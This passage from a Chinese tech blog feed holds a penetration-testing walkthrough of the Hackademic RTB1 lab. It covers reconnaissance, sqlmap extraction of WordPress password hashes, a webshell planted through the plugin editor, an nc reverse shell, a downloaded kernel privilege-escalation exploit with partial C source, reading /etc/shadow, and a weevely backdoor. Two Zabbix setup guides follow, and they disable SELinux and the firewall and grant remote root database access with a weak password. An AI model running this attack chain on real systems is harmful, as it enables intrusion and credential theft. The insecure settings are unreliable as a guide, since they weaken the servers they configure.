<td><a href="http://www.sportforum.net/" target="_blank" rel="noopener">sportforum.net</a></td>
</tr>
<tr>
<td>3</td>
<td>freeonlinesudoku.net</td>
<td><a href="http://www.freeonlinesudoku.net/" target="_blank" rel="noopener">freeonlinesudoku.net</a></td>
</tr>
<tr>
<td>4</td>
<td>cosplayhell.com</td>
<td><a href="http://www.cosplayhell.com/" target="_blank" rel="noopener">cosplayhell.com</a></td>
</tr>
<tr>
<td>5</td>
<td>videogamenews.org</td>
<td><a href="http://www.videogamenews.org/" target="_blank" rel="noopener">videogamenews.org</a></td>
</tr>
<tr>
<td>6</td>
<td>gametour.com</td>
<td><a href="http://www.gametour.com/" target="_blank" rel="noopener">gametour.com</a></td>
</tr>
<tr>
<td>7</td>
<td>qualitypetsitting.net</td>
<td><a href="http://www.qualitypetsitting.net/" target="_blank" rel="noopener">qualitypetsitting.net</a></td>
</tr>
<tr>
<td>8</td>
<td>brendanichols.com</td>
<td><a href="http://www.brendanichols.com/" target="_blank" rel="noopener">brendanichols.com</a></td>
</tr>
<tr>
<td>9</td>
<td>8ez.com</td>
<td><a href="http://www.8ez.com/" target="_blank" rel="noopener">8ez.com</a></td>
</tr>
<tr>
<td>10</td>
<td>hack-test.com</td>
<td><a href="http://www.hack-test.com/" target="_blank" rel="noopener">hack-test.com</a></td>
</tr>
<tr>
<td>11</td>
<td>kisax.com</td>
<td><a href="http://www.kisax.com/" target="_blank" rel="noopener">kisax.com</a></td>
</tr>
<tr>
<td>12</td>
<td>paisans.com</td>
<td><a href="http://www.paisans.com/" target="_blank" rel="noopener">paisans.com</a></td>
</tr>
<tr>
<td>13</td>
<td>mghz.com</td>
<td><a href="http://www.mghz.com/" target="_blank" rel="noopener">mghz.com</a></td>
</tr>
<tr>
<td>14</td>
<td>debateful.com</td>
<td><a href="http://www.debateful.com/" target="_blank" rel="noopener">debateful.com</a></td>
</tr>
<tr>
<td>15</td>
<td>jazzygoodtimes.com</td>
<td><a href="http://www.jazzygoodtimes.com/" target="_blank" rel="noopener">jazzygoodtimes.com</a></td>
</tr>
<tr>
<td>16</td>
<td>fruny.com</td>
<td><a href="http://www.fruny.com/" target="_blank" rel="noopener">fruny.com</a></td>
</tr>
<tr>
<td>17</td>
<td>vbum.com</td>
<td><a href="http://www.vbum.com/" target="_blank" rel="noopener">vbum.com</a></td>
</tr>
<tr>
<td>18</td>
<td>wuckie.com</td>
<td><a href="http://www.wuckie.com/" target="_blank" rel="noopener">wuckie.com</a></td>
</tr>
<tr>
<td>19</td>
<td>force5inc.com</td>
<td><a href="http://www.force5inc.com/" target="_blank" rel="noopener">force5inc.com</a></td>
</tr>
<tr>
<td>20</td>
<td>virushero.com</td>
<td><a href="http://www.virushero.com/" target="_blank" rel="noopener">virushero.com</a></td>
</tr>
<tr>
<td>21</td>
<td>twincitiesbusinesspeernetwork.com</td>
<td><a href="http://www.twincitiesbusinesspeernetwork.com/" target="_blank" rel="noopener">twincitiesbusinesspeernetwork.com</a></td>
</tr>
<tr>
<td>22</td>
<td>jennieko.com</td>
<td><a href="http://www.jennieko.com/" target="_blank" rel="noopener">jennieko.com</a></td>
</tr>
<tr>
<td>23</td>
<td>davereedy.com</td>
<td><a href="http://www.davereedy.com/" target="_blank" rel="noopener">davereedy.com</a></td>
</tr>
<tr>
<td>24</td>
<td>joygarrido.com</td>
<td><a href="http://www.joygarrido.com/" target="_blank" rel="noopener">joygarrido.com</a></td>
</tr>
<tr>
<td>25</td>
<td>prismapp.com</td>
<td><a href="http://www.prismapp.com/" target="_blank" rel="noopener">prismapp.com</a></td>
</tr>
<tr>
<td>26</td>
<td>utiligolf.com</td>
<td><a href="http://www.utiligolf.com/" target="_blank" rel="noopener">utiligolf.com</a></td>
</tr>
</tbody></table>
<p>173.236.138.113上有26个网站，很多黑客为了攻破你的网站可能会检查同服务器上的其它网站，但是本次是以研究为目标，我们将抛开服务器上的其它网站，只针对你的网站来进行入侵检测。</p>
<p>We’ll need more information about your site, such as:</p>
<p>我们需要关于你网站的以下信息：</p>
<ol>
<li>DNS records (A, NS, TXT, MX and SOA)</li>
<li>Web Server Type (Apache, IIS, Tomcat)</li>
<li>Registrar (the company that owns your domain)</li>
<li>Your name, address, email and phone</li>
<li>Scripts that your site uses (php, asp, asp.net, jsp, cfm)</li>
<li>Your server OS (Unix,Linux,Windows,Solaris)</li>
<li>Your server open ports to internet (80, 443, 21, etc.)</li>
</ol>
<h4 id="DNS记录"><a href="#DNS记录" class="headerlink" title="DNS记录"></a>DNS记录</h4><p>我们用who.is来完成这一目标.</p>
<p><img src="/articles/92dfa26d/3.png" alt></p>
<p>我们发现你的DNS记录如下</p>
<p><img src="/articles/92dfa26d/4.png" alt></p>
<h4 id="web服务器的类型和版本"><a href="#web服务器的类型和版本" class="headerlink" title="web服务器的类型和版本"></a>web服务器的类型和版本</h4><p><img src="/articles/92dfa26d/5.png" alt></p>
<p>发现你的Web服务器是apache，接下来确定它的版本.</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">HACK-TEST.COM SITE INFORMATION</span><br><span class="line"></span><br><span class="line">IP: 173.236.138.113</span><br><span class="line">Website Status: active</span><br><span class="line">Server Type: Apache</span><br><span class="line">Alexa Trend/Rank: 从信息收集到入侵提权(渗透测试基础总结) - 第6张  | 阿德马Web安全 1 Month: 3,213,968 3 Month: 2,161,753</span><br><span class="line">Page Views per Visit: 从信息收集到入侵提权(渗透测试基础总结) - 第7张  | 阿德马Web安全 1 Month: 2.0 3 Month: 3.7</span><br></pre></td></tr></table></figure>

<h4 id="网站域名的注册信息"><a href="#网站域名的注册信息" class="headerlink" title="网站域名的注册信息"></a>网站域名的注册信息</h4><p>例如你的电话、邮箱、地址等.</p>
<p><img src="/articles/92dfa26d/6.png" alt></p>
<p>我们现在已经获取了你的网站域名的注册信息，包括你的重要信息等.我们可以通过backtrack 5中的whatweb来获取你的网站服务器操作系统类型和服务器的版本.</p>
<p><img src="/articles/92dfa26d/7.png" alt></p>
<p><img src="/articles/92dfa26d/8.png" alt></p>
<p>我们发现你的网站使用了著名的php整站程序wordpress，服务器的的系统类型为Fedora Linux，Web服务器版本Apache 2.2.15.继续查看网站服务器开放的端口，用渗透测试工具nmap:</p>
<h4 id="查看服务器上运行的服务"><a href="#查看服务器上运行的服务" class="headerlink" title="查看服务器上运行的服务"></a>查看服务器上运行的服务</h4><p><img src="/articles/92dfa26d/9.png" alt></p>
<h4 id="查看操作系统版本"><a href="#查看操作系统版本" class="headerlink" title="查看操作系统版本"></a>查看操作系统版本</h4><p><img src="/articles/92dfa26d/10.png" alt><br>只有80端口是开放的,操作系统是Linux2.6.22（Fedora Core 6），现在我们已经收集了所有关于你网站的重要信息, 接下来开始扫描寻找漏洞,比如:</p>
<p>Sql injection – Blind sql injection – LFI – RFI – XSS – CSRF 等等.</p>
<h4 id="使用Nikto来收集漏洞"><a href="#使用Nikto来收集漏洞" class="headerlink" title="使用Nikto来收集漏洞"></a>使用Nikto来收集漏洞</h4><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">root@bt:/pentest/web/nikto# perl nikto.pl -h hack-test.com</span><br></pre></td></tr></table></figure>

<p><img src="/articles/92dfa26d/11.png" alt><br>我们也会用到Backtrack 5 R1中的W3AF 工具:</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">root@bt:/pentest/web/w3af# ./w3af_gui</span><br></pre></td></tr></table></figure>

<p><img src="/articles/92dfa26d/12.png" alt></p>
<p>我们输入要检测的网站地址,选择完整的安全审计选项.</p>
<p><img src="/articles/92dfa26d/13.png" alt></p>
<p>稍等一会，你将会看到扫描结果.</p>
<p><img src="/articles/92dfa26d/14.png" alt></p>
<p>发现你的网站存在sql注入漏洞、XSS漏洞、以及其它的漏洞.让我们来探讨SQL注入漏洞.</p>
<p><a href="http://hack-test.com/Hackademic_RTB1/?cat=d" target="_blank" rel="noopener">http://hack-test.com/Hackademic_RTB1/?cat=d</a>％27z％220</p>
<p>我们通过工具发现这个URL存在SQL注入，我们通过Sqlmap来检测这个url.</p>
<p>Using sqlmap with –u url</p>
<p><img src="/articles/92dfa26d/15.png" alt></p>
<p>过一会你会看到</p>
<p><img src="/articles/92dfa26d/16.png" alt></p>
<p>输入N按回车键继续</p>
<p><img src="/articles/92dfa26d/17.png" alt></p>
<p>我们发现你的网站存在mysql显错注入，mysql数据库版本是5.0. 我们通过加入参数”-dbs”来尝试采集数据库名.</p>
<p><img src="/articles/92dfa26d/18.png" alt></p>
<p><img src="/articles/92dfa26d/19.png" alt></p>
<p>发现三个数据库,接下来通过参数”-D wordpress -tables”来查看wordpress数据库的所有表名</p>
<p><img src="/articles/92dfa26d/20.png" alt></p>
<p><img src="/articles/92dfa26d/21.png" alt></p>
<p>通过参数“-T wp_users –columns ”来查看wp_users表中的字段.</p>
<p><img src="/articles/92dfa26d/22.png" alt></p>
<p><img src="/articles/92dfa26d/23.png" alt></p>
<p>接下来猜解字段user_login和user_pass的值.用参数”-C user_login,user_pass –dump”</p>
<p><img src="/articles/92dfa26d/24.png" alt></p>
<p>我们会发现用户名和密码hashes值. 我们需要通过以下在线破解网站来破解密码hashes</p>
<p><a href="http://www.onlinehashcrack.com/free-hash-reverse.php" target="_blank" rel="noopener">http://www.onlinehashcrack.com/free-hash-reverse.php</a></p>
<p><img src="/articles/92dfa26d/25.png" alt></p>
<p>登陆wordpress的后台wp-admin</p>
<p>尝试上传php webshell到服务器，以方便运行一些linux命令.在插件页面寻找任何可以编辑的插件. 我们选择Textile这款插件，编辑插入我们的php webshell，点击更新文件，然后访问我们的php webshell.</p>
<p><img src="/articles/92dfa26d/26.png" alt></p>
<p><img src="/articles/92dfa26d/27.png" alt></p>
<p>Php webshell被解析了，我们可以控制你网站的文件，但是我们只希望获得网站服务器的root权限,来入侵服务器上其它的网站。</p>
<p>我们用NC来反弹一个shell,首先在我们的电脑上监听5555端口.</p>
<p><img src="/articles/92dfa26d/28.png" alt></p>
<p>然后在Php webshell上反向连接我们的电脑，输入你的IP和端口5555.<br> <img src="/articles/92dfa26d/29.png" alt></p>
<p>点击连接我们会看到</p>
<p><img src="/articles/92dfa26d/30.png" alt> </p>
<p>接下来我们尝试执行一些命令：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">id</span><br><span class="line">uid=48(apache) gid=489(apache) groups=489(apache)</span><br><span class="line"> （用来显示用户的id和组）</span><br><span class="line"></span><br><span class="line">pwd</span><br><span class="line">/var/www/html/Hackademic_RTB1/wp-content/plugins</span><br><span class="line"> （显示服务器上当前的路径）</span><br><span class="line"></span><br><span class="line">uname -a</span><br><span class="line">Linux HackademicRTB1 2.6.31.5-127.fc12.i686 #1 SMP Sat Nov 7 21:41:45 EST 2009 i686 i686 i386 GNU/Linux</span><br><span class="line">（显示内核版本信息）</span><br></pre></td></tr></table></figure>

<p><img src="/articles/92dfa26d/31.png" alt></p>
<p>现在我们知道，服务器的内核版本是2.6.31.5-127.fc12.1686,我们在exploit-db.com中搜索此版本的相关漏洞.<br>在服务器上测试了很多exp之后，我们用以下的exp来提升权限.<br><a href="http://www.exploit-db.com/exploits/15285" target="_blank" rel="noopener">http://www.exploit-db.com/exploits/15285</a></p>
<p>我们在nc shell上执行以下命令:</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">wget http://www.exploit-db.com/exploits/15285 -o roro.c</span><br></pre></td></tr></table></figure>

<p>(下载exp到服务器并重命名为roro.c)<br>注：很多linux内核的exp都是C语言开发的,因此我们保存为.c扩展名.<br>exp roro.c代码如下：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta"># <span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta"># <span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta"># <span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta"># <span class="meta-keyword">include</span> <span class="meta-string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta"># <span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta"># <span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/socket.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta"># <span class="meta-keyword">include</span> <span class="meta-string">&lt;netinet/in.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta"># <span class="meta-keyword">include</span> <span class="meta-string">&lt;errno.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta"># <span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta"># <span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/ptrace.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta"># <span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/utsname.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta"># <span class="meta-keyword">define</span> RECVPORT 5555</span></span><br><span class="line"></span><br><span class="line"><span class="meta"># <span class="meta-keyword">define</span> SENDPORT 6666</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">prep_sock</span><span class="params">(<span class="keyword">int</span> port)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">int</span> s, ret;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">sockaddr_in</span> <span class="title">addr</span>;</span></span><br><span class="line">s = socket(PF_RDS, SOCK_SEQPACKET, <span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span>(s &lt; <span class="number">0</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">printf</span>(“[*] Could <span class="keyword">not</span> open socket.\n”);</span><br><span class="line"><span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">memset</span>(&amp;addr, <span class="number">0</span>, <span class="keyword">sizeof</span>(addr));</span><br></pre></td></tr></table></figure>

<p>通过以上代码我们发现该exp是C语言开发的，我们需要将他编译成elf格式的,命令如下:</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">gcc roro.c –o roro</span><br></pre></td></tr></table></figure>

<p>接下来执行编译好的exp</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">./roro</span><br></pre></td></tr></table></figure>

<p><img src="/articles/92dfa26d/32.png" alt><br>执行完成之后我们输入id命令</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">id</span><br></pre></td></tr></table></figure>

<p>我们发现我们已经是root权限了</p>
<p>uid=0(root) gid=0(root)</p>
<p><img src="/articles/92dfa26d/33.png" alt><br>现在我们可以查看/etc/shadow文件</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">cat /etc/shadow</span><br></pre></td></tr></table></figure>

<p><img src="/articles/92dfa26d/34.png" alt></p>
<p>查看/etc/passwd 文件</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">cat /etc/passwd</span><br></pre></td></tr></table></figure>

<p> <img src="/articles/92dfa26d/35.png" alt><br>我们可以使用”john the ripper”工具破解所有用户的密码.但是我们不会这样做，我们需要在这个服务器上留下后门以方便我们在任何时候访问它.</p>
<p>我们用weevely制作一个php小马上传到服务器上.</p>
<p>1.weevely使用选项</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">root@bt:/pentest/backdoors/web/weevely# ./main.py –</span><br></pre></td></tr></table></figure>

<p><img src="/articles/92dfa26d/36.png" alt></p>
<p>2.用weevely创建一个密码为koko的php后门</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">root@bt:/pentest/backdoors/web/weevely# ./main.py -g -o hax.php -p koko</span><br></pre></td></tr></table></figure>

<p><img src="/articles/92dfa26d/37.png" alt></p>
<p>接下来上传到服务器之后来使用它</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">root@bt:/pentest/backdoors/web/weevely# ./main.py -t -u http://hack-test.com/Hackademic_RTB1/wp-content/plugins/hax.php -p koko</span><br></pre></td></tr></table></figure>

<p><img src="/articles/92dfa26d/38.png" alt></p>
<p>测试我们的hax.php后门</p>
<p><img src="/articles/92dfa26d/39.png" alt></p>
<p>总结:</p>
<p>在这边文章中我们学到的一些技术正被黑客用来入侵你的网站和服务器，我们希望能通过这篇文章能够对你未来维护服务器和网站安全有所帮助.</p>
]]></content>
      <categories>
        <category>运维技术</category>
        <category>安全工具</category>
      </categories>
      <tags>
        <tag>Kali</tag>
      </tags>
  </entry>
  <entry>
    <title>zabbix-proxy安装部署</title>
    <url>/articles/3f5bc800.html</url>
    <content><![CDATA[<h2 id="目的"><a href="#目的" class="headerlink" title="目的"></a>目的</h2><p>随着互联网公司的不断发展和业务的不断拓展，只用zabbix-server单节点作为数据收集已越来越吃力，不能满足需求，这是扩展zabbix监控系统势在必行，zabbix-proxy代理就可以帮到你，能够有效的分担server压力。本文详细介绍了zabbix-proxy的安装部署过程，因互联网公司线上业务稳定性是最重要的，监控系统更是如此，所有监控系统搭建时版本建议用长期支持版。</p>
<a id="more"></a>

<h2 id="环境配置"><a href="#环境配置" class="headerlink" title="环境配置"></a>环境配置</h2><h4 id="查看selinux状态"><a href="#查看selinux状态" class="headerlink" title="查看selinux状态"></a><strong>查看selinux状态</strong></h4><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[root@localhost ~]# sestatus  </span><br><span class="line"></span><br><span class="line">SELinux status:                 enabled  </span><br><span class="line"></span><br><span class="line">SELinuxfs mount:                /sys/fs/selinux  </span><br><span class="line"></span><br><span class="line">SELinux root directory:         /etc/selinux  </span><br><span class="line"></span><br><span class="line">Loaded policy name:             targeted  </span><br><span class="line"></span><br><span class="line">Current mode:                   enforcing  </span><br><span class="line"></span><br><span class="line">Mode from config file:          enforcing  </span><br><span class="line"></span><br><span class="line">Policy MLS status:              enabled  </span><br><span class="line"></span><br><span class="line">Policy deny_unknown status:     allowed  </span><br><span class="line"></span><br><span class="line">Max kernel policy version:      28</span><br></pre></td></tr></table></figure>

<h4 id="临时关闭-sellinux"><a href="#临时关闭-sellinux" class="headerlink" title="临时关闭 sellinux"></a><strong>临时关闭 sellinux</strong></h4><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[root@localhost ~]# setenforce 0</span><br></pre></td></tr></table></figure>

<h4 id="永久关闭"><a href="#永久关闭" class="headerlink" title="永久关闭"></a>永久关闭</h4><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash">可以修改配置文件/etc/selinux/config,将其中SELINUX设置为disabled。</span></span><br><span class="line">[root@localhost ~]# cat /etc/selinux/config   </span><br><span class="line"></span><br><span class="line">   </span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> This file controls the state of SELinux on the system.  </span></span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> SELINUX= can take one of these three values:  </span></span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash">     enforcing - SELinux security policy is enforced.  </span></span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash">     permissive - SELinux prints warnings instead of enforcing.  </span></span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash">     disabled - No SELinux policy is loaded.  </span></span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash">SELINUX=enforcing  </span></span><br><span class="line"></span><br><span class="line">SELINUX=disabled  </span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> SELINUXTYPE= can take one of three two values:  </span></span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash">     targeted - Targeted processes are protected,  </span></span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash">     minimum - Modification of targeted policy. Only selected processes are protected.   </span></span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash">     mls - Multi Level Security protection.  </span></span><br><span class="line"></span><br><span class="line">SELINUXTYPE=targeted</span><br><span class="line"></span><br><span class="line"> </span><br><span class="line"></span><br><span class="line">[root@rdo ~]# sestatus  </span><br><span class="line"></span><br><span class="line">SELinux status:                 disabled</span><br></pre></td></tr></table></figure>

<h4 id="关闭防火墙"><a href="#关闭防火墙" class="headerlink" title="关闭防火墙"></a><strong>关闭防火墙</strong></h4><p>直接关闭防火墙</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">systemctlstop firewalld.service #停止firewall</span><br><span class="line">systemctldisable firewalld.service #禁止firewall开机启动</span><br></pre></td></tr></table></figure>

<h2 id="安装数据库"><a href="#安装数据库" class="headerlink" title="安装数据库"></a>安装数据库</h2><p>我们现在来配置mysql数据库。</p>
<h4 id="开机自启动mysql，并启动mysql"><a href="#开机自启动mysql，并启动mysql" class="headerlink" title="开机自启动mysql，并启动mysql"></a>开机自启动mysql，并启动mysql</h4><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">systemctlenable mariadb</span><br><span class="line"></span><br><span class="line">systemctlstart mariadb</span><br></pre></td></tr></table></figure>

<p> <img src="/articles/3f5bc800/1.png" alt="img"></p>
<h4 id="初始化mysql数据库，并配置root用户密码"><a href="#初始化mysql数据库，并配置root用户密码" class="headerlink" title="初始化mysql数据库，并配置root用户密码"></a>初始化mysql数据库，并配置root用户密码</h4><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">mysql_secure_installation</span><br></pre></td></tr></table></figure>

<p><img src="/articles/3f5bc800/2.png" alt="img"></p>
<p>注意：在上图中的Enter current passwdord for root处，我们直接敲回车键即可。因为centos7上mysql的默认root用户密码为空。</p>
<p>下图中主要是为root用户配置密码，并刷新相关权限。</p>
<p><img src="/articles/3f5bc800/3.png" alt="img"></p>
<p><img src="/articles/3f5bc800/4.png" alt="img"></p>
<p>上图中主要是配置匿名用户、test用户以及root用户远程连接等相关配置。</p>
<h4 id="创建zabbix数据库及其用户"><a href="#创建zabbix数据库及其用户" class="headerlink" title="创建zabbix数据库及其用户"></a>创建zabbix数据库及其用户</h4><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">mysql -u root –p</span><br></pre></td></tr></table></figure>

<p><img src="/articles/3f5bc800/5.png" alt="img"></p>
<figure class="highlight"><table><tr><td class="code"><pre><span class="line">&gt; create database zabbix_proxycharacter set utf8;      #数据名可以跟server端名称不同</span><br><span class="line"></span><br><span class="line">&gt; GRANT ALL PRIVILEGES ON zabbix_proxy.* TO 'zabbix'@'localhost'  IDENTIFIED BY 'zabbix-proxy';</span><br><span class="line"></span><br><span class="line">&gt; GRANT ALL PRIVILEGES ON zabbix_proxy.* TO'zabbix'@'%'  IDENTIFIED BY 'zabbix-proxy';</span><br><span class="line"></span><br><span class="line">&gt; flush PRIVILEGES;</span><br><span class="line"></span><br><span class="line">&gt; set GLOBAL max_connections=10000;</span><br><span class="line"></span><br><span class="line">&gt; grant all privileges on *.* to root@'%'identified by 'tdr123';    #也可以放行root访问权限</span><br><span class="line"></span><br><span class="line">&gt; flush privileges;</span><br><span class="line"></span><br><span class="line">&gt; exit;</span><br></pre></td></tr></table></figure>

<p> <img src="/articles/3f5bc800/6.png" alt="img"></p>
<h2 id="安装zabbix-proxy"><a href="#安装zabbix-proxy" class="headerlink" title="安装zabbix proxy"></a>安装zabbix proxy</h2><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">rpm -ivh http://repo.zabbix.com/zabbix/3.0/rhel/7/x86_64/zabbix-release-3.0-1.el7.noarch.rpm</span><br><span class="line">yum install -y  zabbix-proxy zabbix-java-gateway zabbix-agent zabbix-get mariadb*</span><br></pre></td></tr></table></figure>

<p> <img src="/articles/3f5bc800/7.png" alt="img">**</p>
<p>以上安装完毕后，我们现在开始进行zabbix的相关配置。</p>
<h4 id="导入zabbix数据库结构："><a href="#导入zabbix数据库结构：" class="headerlink" title="导入zabbix数据库结构："></a>导入zabbix数据库结构：</h4><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">cd /usr/share/doc/zabbix-proxy-mysql-3.0.9/</span><br><span class="line">zcat schema.sql.gz| mysql -uroot -p zabbix_proxy</span><br></pre></td></tr></table></figure>

<p><img src="/articles/3f5bc800/8.png" alt="img"></p>
<h4 id="修改zabbix-proxy的配置文件"><a href="#修改zabbix-proxy的配置文件" class="headerlink" title="修改zabbix proxy的配置文件"></a>修改zabbix proxy的配置文件</h4><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">vim  /etc/zabbix/zabbix-proxy.conf</span><br><span class="line"></span><br><span class="line">Server=192.168.11.139    #同步指向的server端的IP，非本地IP。可以是server端的主机域名，但要确保proxy端解析server的域名，并且网络可达</span><br><span class="line"></span><br><span class="line">Hostname=zabbix-proxy-sh140  #proxy本地的名称，此名称需要与将来在server端的WEB页面上的代理程序名称一致，名称自定义</span><br><span class="line"></span><br><span class="line">DBHost=localhost           #与上面配置对应</span><br><span class="line"></span><br><span class="line">DBName=zabbix_proxy   #与上面配置对应</span><br><span class="line"></span><br><span class="line">DBUser=zabbix               #与上面配置对应</span><br><span class="line"></span><br><span class="line">DBPassword=zabbix-proxy   #与上面配置对应</span><br><span class="line"></span><br><span class="line">DBPort=3306                      #与上面配置对应</span><br><span class="line"></span><br><span class="line">StartDiscoverers=4              #与server端配置的功能说明一致。</span><br><span class="line"></span><br><span class="line">JavaGateway=127.0.0.1       #与server端配置的功能说明一致。</span><br><span class="line"></span><br><span class="line">JavaGatewayPort=10052     #与server端配置的功能说明一致。</span><br><span class="line"></span><br><span class="line">StartJavaPollers=4              #与server端配置的功能说明一致。</span><br><span class="line"></span><br><span class="line">StartSNMPTrapper=1</span><br></pre></td></tr></table></figure>

<p>Hostname=zabbix-proxy-sh140  #proxy本地的名称，此名称需要与将来在server端的WEB页面上的代理程序名称一致，名称自定义</p>
<p>DBHost=localhost           #与上面配置对应</p>
<p>DBName=zabbix_proxy   #与上面配置对应</p>
<p>DBUser=zabbix               #与上面配置对应</p>
<p>DBPassword=zabbix-proxy   #与上面配置对应</p>
<p>DBPort=3306                      #与上面配置对应</p>
<p>StartDiscoverers=4              #与server端配置的功能说明一致。</p>
<p>JavaGateway=127.0.0.1       #与server端配置的功能说明一致。</p>
<p>JavaGatewayPort=10052     #与server端配置的功能说明一致。</p>
<p>StartJavaPollers=4              #与server端配置的功能说明一致。</p>
<p>StartSNMPTrapper=1</p>
<p><img src="/articles/3f5bc800/9.png" alt="img"></p>
<h4 id="启动服务"><a href="#启动服务" class="headerlink" title="启动服务"></a>启动服务</h4><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> service  zabbix-java-gateway start</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> service  zabbix-proxy start</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> chkconfig zabbix-java-gateway on</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> chkconfig zabbix-proxy on</span></span><br></pre></td></tr></table></figure>

<p><img src="/articles/3f5bc800/10.png" alt="img"></p>
<h4 id="更新备监控的主机zabbix-agentd-win-conf"><a href="#更新备监控的主机zabbix-agentd-win-conf" class="headerlink" title="更新备监控的主机zabbix_agentd.win.conf"></a>更新备监控的主机zabbix_agentd.win.conf</h4><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">Server=192.168.11.140</span><br><span class="line">ServerActive=192.168.11.140</span><br></pre></td></tr></table></figure>

<p>修改完后重启zabbix_agent服务</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">service zabbix-agent restart</span><br></pre></td></tr></table></figure>

<h2 id="新增代理配置"><a href="#新增代理配置" class="headerlink" title="新增代理配置"></a>新增代理配置</h2><p><img src="/articles/3f5bc800/11.png" alt="img"></p>
<p>最终效果：</p>
<p><img src="/articles/3f5bc800/12.png" alt="img"></p>
]]></content>
      <categories>
        <category>监控技术</category>
        <category>Zabbix</category>
      </categories>
      <tags>
        <tag>Zabbix</tag>
      </tags>
  </entry>
  <entry>
    <title>zabbix3.0.x在lnmp全编译安装</title>
    <url>/articles/3131633d.html</url>
    <content><![CDATA[<h2 id="目的"><a href="#目的" class="headerlink" title="目的"></a>目的</h2><p>zabbix是一个基于WEB界面的提供分布式系统监视以及网络监视功能的企业级的开源解决方案。因其监控方式多样，上手容易在互联网行业备受欢迎。那么本文就详细介绍编译安装zabbix长期支持版本(LST).</p>
<a id="more"></a>

<h2 id="环境版本："><a href="#环境版本：" class="headerlink" title="环境版本："></a>环境版本：</h2><h4 id="lnmp系统："><a href="#lnmp系统：" class="headerlink" title="lnmp系统："></a>lnmp系统：</h4><p>​    ubuntu 14.04</p>
<p>​    nginx 1.10.1</p>
<p>​    mysql 5.7.13</p>
<p>​    php 5.6.23</p>
<h4 id="监控系统："><a href="#监控系统：" class="headerlink" title="监控系统："></a>监控系统：</h4><p>​    zabbix 3.0.3</p>
<p>​    zatree 3.0.x</p>
<p>​    grafana 3.1.0</p>
<h4 id="安装路径："><a href="#安装路径：" class="headerlink" title="安装路径："></a>安装路径：</h4><p>程序安装路径：/opt/zabbix</p>
<p>数据路径：/data/zabbix</p>
